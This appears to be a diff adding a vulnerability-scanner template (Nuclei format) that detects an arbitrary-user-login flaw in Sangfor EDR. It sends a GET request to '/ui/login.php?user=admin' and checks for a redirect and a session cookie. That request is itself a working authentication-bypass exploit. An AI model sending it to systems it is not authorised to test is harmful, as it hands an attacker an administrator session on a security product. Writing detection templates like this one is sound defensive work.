@@ -1,0 +1,24 @@
+id: sangfor-edr-arbitrary-user-login
+info:
+  name: "Sangfor EDR 任意用户登录漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: Sangfor EDR
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ui/login.php?user=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "SANGFOR终端检测响应平台"
+      - type: word
+        part: header
+        words:
+          - "index.php"
+          - "PHPSESSID"
